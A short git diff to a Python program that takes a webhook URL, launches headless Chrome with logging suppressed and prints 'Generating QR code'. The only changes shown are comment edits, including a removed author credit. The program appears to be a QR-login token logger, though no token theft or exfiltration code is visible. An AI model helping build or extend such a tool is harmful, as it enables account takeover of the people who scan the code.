@@ -39,9 +39,7 @@ from logger import log_unknown_exceptions
 
 @log_unknown_exceptions(ERROR)
 def main(webhook_url: str) -> None:
-    """The main function of the program.
-    \nProgram by Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0
-    """
+    #The main function of the program.
     Write.Print('\n\n[!] Generating QR code...', Colors.red_to_purple)
     opts = webdriver.ChromeOptions()
     opts.add_argument('--headless')
@@ -49,7 +47,7 @@ def main(webhook_url: str) -> None:
     opts.add_experimental_option('excludeSwitches', ['enable-logging'])
     opts.add_argument('--log-level 3')
 
-    # This module conflicts with PyStyle; importing here prevents this issue.
+    # This module have conflicts with PyStyle; importing here prevents the issue.
     from webdriver_manager.chrome import ChromeDriverManager
 
     os.environ['WDM_LOG_LEVEL'] = '0'
